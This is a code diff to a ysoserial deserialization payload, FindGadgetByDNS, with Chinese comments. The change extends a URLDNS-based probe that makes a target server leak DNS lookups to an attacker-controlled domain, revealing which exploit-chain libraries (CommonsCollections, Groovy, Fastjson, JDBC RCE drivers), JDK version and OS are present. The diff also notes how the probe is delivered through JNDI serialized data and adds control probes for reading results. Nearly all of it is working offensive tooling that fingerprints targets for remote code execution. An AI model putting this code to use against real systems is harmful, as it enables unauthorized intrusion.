@@ -1,36 +1,138 @@
 package ysoserial.payloads;
 
 
+import com.bloom.util.Fuzz;
 import ysoserial.payloads.annotation.PayloadTest;
 import ysoserial.payloads.util.PayloadRunner;
 
 import java.util.HashMap;
 import java.util.LinkedList;
 import java.util.List;
+import java.util.Random;
 
+/**
+ * 批量 DNS 探测：一次请求返回一组 URLDNS 变体探针，每个探针只在目标端
+ * 存在对应标记类时才触发 DNS 解析，用于判断目标 classpath 上可用的利用链依赖。
+ *
+ * 判读规则（配合 dnslog 类平台）：
+ * 1. 每次请求生成 6 位随机串 runId，探针 URL 形如 http://{marker}.{runId}.{domain}。
+ *    判读时剥掉用户自己的 {domain}，剩余两段中左边是 marker，右边是 runId（同批去重用）。
+ * 2. ctrlp（java.lang.Object）必须触发。未触发说明反序列化链不可达或目标 DNS 出网被拦，
+ *    此时所有阴性结果都不可信。
+ * 3. ctrln（必然不存在的类）必须不触发。触发说明探测环境存在误报（如通配捕获）。
+ * 4. 目标端某个标记类缺失不会中断其余探针的执行（JDK 对 Class 解析失败采用延迟异常），
+ *    一次请求即可拿到全部结果。
+ * 5. 注意：本模块通过 javaSerializedData 投递。目标 JDK 在 8u431 / 11.0.25 / 17.0.13 /
+ *    21.0.5 之后默认 com.sun.jndi.ldap.object.trustSerialData=false，整个批次失效。
+ *
+ * 版本判别机制：探针以 TC_CLASS 按类名在目标端解析，类存在才触发 DNS。
+ * 各版本段探针靠「标记（内部）类只存在于特定版本段」区分版本，与 serialVersionUID 无关。
+ */
 @SuppressWarnings({ "rawtypes", "unchecked" })
 @PayloadTest(skip = "true")
 public class FindGadgetByDNS implements ObjectPayload<Object> {
     private String dnsDomain;
 
-    private static List<Object> list = new LinkedList<Object>();
-    private static String[] defaultclass = {
-        "CommonsCollections13567",
-        "CommonsCollections24",
-        "CommonsBeanutils2","C3P0",
-        "AspectJWeaver",
-        "bsh",
-        "Groovy",
-        "Becl",
-        "snakeyaml",
-        "javaVersion",
-        "winlinux",
-        "el", "XStream",
-        "mvel"};
+    /**
+     * 探针表：{子域 marker, 标记类全名}。
+     * 标记类尽量引用 Fuzz.Fuzzmap 保持单一来源。老 marker 保持原样便于对账。
+     */
+    private static final String[][] PROBES = {
+            // CommonsCollections1/3/5/6/7 链，需要 <=3.2.1 版本
+            {"cc31or321", "org.apache.commons.collections.functors.ChainedTransformer"},
+            {"cc322", "org.apache.commons.collections.ExtendedProperties$1"},
+            // CommonsCollections2/4 链，需要 4-4.0 版本
+            {"cc40", "org.apache.commons.collections4.functors.ChainedTransformer"},
+            {"cc41", "org.apache.commons.collections4.FluentIterable"},
+            // CommonsBeanutils 版本段：标记内部类只在对应版本段存在
+            {"cb17", "org.apache.commons.beanutils.MappedPropertyDescriptor$1"},
+            {"cb18x", "org.apache.commons.beanutils.DynaBeanMapDecorator$MapEntry"},
+            {"cb19x", "org.apache.commons.beanutils.BeanIntrospectionData"},
+            // c3p0 版本段：标记类只在对应版本段存在
+            {"c3p092x", "com.mchange.v2.c3p0.impl.PoolBackedDataSourceBase"},
+            {"c3p095x", "com.mchange.v2.c3p0.test.AlwaysFailDataSource"},
+            // BeanShell1 链入口类
+            {"BeanShell2", "bsh.Interpreter"},
+            // bsh 版本段：标记内部类只在对应版本段存在（2.0b6 无法反序列化）
+            {"bsh20b4", "bsh.CollectionManager$1"},
+            {"bsh20b5", "bsh.engine.BshScriptEngine"},
+            {"bsh20b6", "bsh.collection.CollectionIterator$1"},
+            // Groovy 版本段：标记（内部）类只在对应版本段存在
+            {"groovy1702311", "org.codehaus.groovy.reflection.ClassInfo$ClassInfoSet"},
+            {"groovy24x", "groovy.lang.Tuple2"},
+            {"groovy244", "org.codehaus.groovy.runtime.dgm$1170"},
+            // Becl，JDK<8u251
+            {"becl", "com.sun.org.apache.bcel.internal.util.ClassLoader"},
+            // snakeyaml
+            {"snakeyaml", "org.yaml.snakeyaml.Yaml"},
+            // JDK<=7u21
+            {"Jdk7u21", "com.sun.corba.se.impl.orbutil.ORBClassLoader"},
+            // 7u25<=JDK<=8u20，8u25 及 JDK<=7u21 会误报，结合 Jdk7u21 判读
+            {"JRE8u20", "javax.swing.plaf.metal.MetalFileChooserUI$DirectoryComboBoxModel$1"},
+            // 目标操作系统判别
+            {"linux", "sun.awt.X11.AwtGraphicsConfigData"},
+            {"windows", "sun.awt.windows.WButtonPeer"},
+            // tomcatBypass（javax）
+            {"el", "javax.el.ELProcessor"},
+            // XStream
+            {"XStream", "com.thoughtworks.xstream.XStream"},
+            // mvel
+            {"mvel", Fuzz.Fuzzmap.get("mvel")},
+            // 反序列化链依赖组
+            {"cb1", Fuzz.Fuzzmap.get("CommonsBeanutils1")},
+            {"hibernate", Fuzz.Fuzzmap.get("hibernate")},
+            {"json1", Fuzz.Fuzzmap.get("JSON1")},
+            {"fileupload1", Fuzz.Fuzzmap.get("FileUpload1")},
+            {"rome", Fuzz.Fuzzmap.get("rome")},
+            {"rhino1", Fuzz.Fuzzmap.get("MozillaRhino1")},
+            {"clojure", Fuzz.Fuzzmap.get("Clojure")},
+            // JDBC/BeanFactory 组
+            {"h2", Fuzz.Fuzzmap.get("h2Driver")},
+            {"druid", Fuzz.Fuzzmap.get("druidjdbc")},
+            {"tomcatjdbc", Fuzz.Fuzzmap.get("tomcatjdbc")},
+            {"tdbcp1", Fuzz.Fuzzmap.get("tomcat_dbcp1_RCE")},
+            {"tdbcp2", Fuzz.Fuzzmap.get("tomcat_dbcp2_RCE")},
+            {"cdbcp1", Fuzz.Fuzzmap.get("commons_dbcp1_RCE")},
+            {"cdbcp2", Fuzz.Fuzzmap.get("commons_dbcp2_RCE")},
+            // jakarta 组（Tomcat 10 / Spring Boot 3）
+            {"jel", "jakarta.el.ELProcessor"},
+            // P2: JDBC 新链探测
+            {"postgresql", Fuzz.Fuzzmap.get("postgresql")},
+            {"mysql8", Fuzz.Fuzzmap.get("mysql8")},
+            {"mysql5", Fuzz.Fuzzmap.get("mysql5")},
+            {"hikaricp", Fuzz.Fuzzmap.get("hikaricp")},
+            // P2: Fastjson 探测
+            {"fastjson1", Fuzz.Fuzzmap.get("fastjson1")},
+            {"fastjson2", Fuzz.Fuzzmap.get("fastjson2")},
+            // P2: 高版本 Tomcat 替代利用探测
+            {"memUserDb", Fuzz.Fuzzmap.get("memoryUserDb")},
+            {"velocity", Fuzz.Fuzzmap.get("velocity")},
+            {"jshell", Fuzz.Fuzzmap.get("jshell")},
+            // P3: Hessian / Jackson
+            {"hessian", Fuzz.Fuzzmap.get("hessian")},
+            {"jackson", Fuzz.Fuzzmap.get("jackson")},
+            // JDK 版本组：java.* 标记在生成时由工具机本地解析，
+            // 工具机 JDK 没有该类时自动跳过（见 getObject 容错）
+            {"jdk8", "java.time.LocalDate"},
+            {"jdk9", "java.lang.Module"},
+            {"jdk11p", "java.net.http.HttpClient"},
+            // 对照组：正控必须触发，负控必须不触发
+            {"ctrlp", "java.lang.Object"},
+            {"ctrln", "com.bloom.probe.NegativeControl"},
+    };
 
     public Object getObject(final String dnsDomain) throws Exception {
-        FindGadgetByDNS urldns2List = new FindGadgetByDNS(dnsDomain);
-        return urldns2List.genClassList();
+        String runId = randomRunId();
+        String domain = runId + "." + dnsDomain;
+        List<Object> list = new LinkedList<Object>();
+        for (String[] probe : PROBES) {
+            try {
+                list.add(genFindClassByDNSGadget("http://" + probe[0] + "." + domain, probe[1]));
+            } catch (Throwable t) {
+                System.out.println("[FindGadgetByDNS] 跳过标记 " + probe[0] + ": " + t.getMessage());
+            }
+        }
+        return list;
     }
 
     public FindGadgetByDNS(){}
@@ -39,106 +141,16 @@ public class FindGadgetByDNS implements ObjectPayload<Object> {
         this.dnsDomain = dnsDomain;
     }
 
-    public List<Object> genClassList() throws Exception {
-        for (int i = 0; i < defaultclass.length; i++) {
-            genClassList(i);
+    /** 6 位随机串：首字符保证字母，整体仅含 DNS 安全字符。 */
+    private static String randomRunId() {
+        Random random = new Random();
+        StringBuilder sb = new StringBuilder(6);
+        sb.append((char) ('a' + random.nextInt(26)));
+        for (int i = 1; i < 6; i++) {
+            int n = random.nextInt(36);
+            sb.append((char) (n < 26 ? 'a' + n : '0' + n - 26));
         }
-        return list;
-    }
-
-    public void genClassList(int clazzType) throws Exception{
-        switch (clazzType) {
-            case 0:
-                //CommonsCollections1/3/5/6/7链,需要<=3.2.1版本
-                HashMap cc31or321 = genFindClassByDNSGadget("http://cc31or321."+dnsDomain, "org.apache.commons.collections.functors.ChainedTransformer");
-                HashMap cc322 = genFindClassByDNSGadget("http://cc322."+dnsDomain, "org.apache.commons.collections.ExtendedProperties$1");
-                list.add(cc31or321);
-                list.add(cc322);
-                break;
-            case 1:
-                //CommonsCollections2/4链,需要4-4.0版本
-                HashMap cc40 = genFindClassByDNSGadget("http://cc40."+dnsDomain,  "org.apache.commons.collections4.functors.ChainedTransformer");
-                HashMap cc41 = genFindClassByDNSGadget("http://cc41."+dnsDomain,  "org.apache.commons.collections4.FluentIterable");
-                list.add(cc40);
-                list.add(cc41);
-                break;
-            case 2:
-                //CommonsBeanutils2链,serialVersionUID不同,1.7x-1.8x为-3490850999041592962,1.9x为-2044202215314119608
-                HashMap cb17 = genFindClassByDNSGadget("http://cb17."+dnsDomain, "org.apache.commons.beanutils.MappedPropertyDescriptor$1");
-                HashMap cb18x = genFindClassByDNSGadget("http://cb18x."+dnsDomain, "org.apache.commons.beanutils.DynaBeanMapDecorator$MapEntry");
-                HashMap cb19x = genFindClassByDNSGadget("http://cb19x."+dnsDomain, "org.apache.commons.beanutils.BeanIntrospectionData");
-                list.add(cb17);
-                list.add(cb18x);
-                list.add(cb19x);
-                break;
-            case 3:
-                //c3p0，serialVersionUID不同,0.9.2pre2-0.9.5pre8为7387108436934414104,0.9.5pre9-0.9.5.5为7387108436934414104
-                HashMap c3p092x = genFindClassByDNSGadget("http://c3p092x."+dnsDomain, "com.mchange.v2.c3p0.impl.PoolBackedDataSourceBase");
-                HashMap c3p095x = genFindClassByDNSGadget("http://c3p095x."+dnsDomain, "com.mchange.v2.c3p0.test.AlwaysFailDataSource");
-                list.add(c3p092x);
-                list.add(c3p095x);
-                break;
-            case 4:
-                //BeanShell2
-                HashMap ajw = genFindClassByDNSGadget("http://BeanShell2."+dnsDomain, "bsh.Interpreter");
-                list.add(ajw);
-                break;
-            case 5:
-                //bsh,serialVersionUID不同,2.0b4为4949939576606791809,2.0b5为4041428789013517368,2.0.b6无法反序列化
-                HashMap bsh20b4 = genFindClassByDNSGadget("http://bsh20b4."+dnsDomain, "bsh.CollectionManager$1");
-                HashMap bsh20b5 = genFindClassByDNSGadget("http://bsh20b5."+dnsDomain, "bsh.engine.BshScriptEngine");
-                HashMap bsh20b6 = genFindClassByDNSGadget("http://bsh20b6."+dnsDomain, "bsh.collection.CollectionIterator$1");
-                list.add(bsh20b4);
-                list.add(bsh20b5);
-                list.add(bsh20b6);
-                break;
-            case 6:
-                //Groovy,1.7.0-2.4.3,serialVersionUID不同,2.4.x为-8137949907733646644,2.3.x为1228988487386910280
-                HashMap groovy1702311 = genFindClassByDNSGadget("http://groovy1702311."+dnsDomain, "org.codehaus.groovy.reflection.ClassInfo$ClassInfoSet");
-                HashMap groovy24x = genFindClassByDNSGadget("http://groovy24x."+dnsDomain, "groovy.lang.Tuple2");
-                HashMap groovy244 = genFindClassByDNSGadget("http://groovy244."+dnsDomain, "org.codehaus.groovy.runtime.dgm$1170");
-                list.add(groovy1702311);
-                list.add(groovy24x);
-                list.add(groovy244);
-                break;
-            case 7:
-                //Becl,JDK<8u251
-                HashMap becl = genFindClassByDNSGadget("http://becl."+dnsDomain, "com.sun.org.apache.bcel.internal.util.ClassLoader");
-                list.add(becl);
-                break;
-            case 8:
-                //snakeyaml
-                HashMap snakeyaml = genFindClassByDNSGadget("http://snakeyaml."+dnsDomain, "org.yaml.snakeyaml.Yaml");
-                list.add(snakeyaml);
-                break;
-            case 9:
-                //JDK<=7u21
-                HashMap Jdk7u21 = genFindClassByDNSGadget("http://Jdk7u21."+dnsDomain, "com.sun.corba.se.impl.orbutil.ORBClassLoader");
-                list.add(Jdk7u21);
-                //7u25<=JDK<=8u20,虽然叫JRE8u20其实JDK8u20也可以,这个检测不完美,8u25版本以及JDK<=7u21会误报,可综合Jdk7u21来看
-                HashMap JRE8u20 = genFindClassByDNSGadget("http://JRE8u20."+dnsDomain, "javax.swing.plaf.metal.MetalFileChooserUI$DirectoryComboBoxModel$1");
-                list.add(JRE8u20);
-                break;
-            case 10:
-                //windows/linux版本判断
-                HashMap linux = genFindClassByDNSGadget("http://linux."+dnsDomain, "sun.awt.X11.AwtGraphicsConfigData");
-                HashMap windows = genFindClassByDNSGadget("http://windows."+dnsDomain, "sun.awt.windows.WButtonPeer");
-                list.add(linux);
-                list.add(windows);
-                break;
-            case 11:
-                //tomcatBypass
-                HashMap el = genFindClassByDNSGadget("http://el."+dnsDomain,  "javax.el.ELProcessor");
-                list.add(el);
-                break;
-            case 12:
-                //XStream
-                HashMap XStream = genFindClassByDNSGadget("http://XStream."+dnsDomain,  "com.thoughtworks.xstream.XStream");
-                list.add(XStream);
-                break;
-            default:
-                break;
-        }
+        return sb.toString();
     }
 
     public static HashMap genFindClassByDNSGadget(String url, String clazzName) throws Exception{
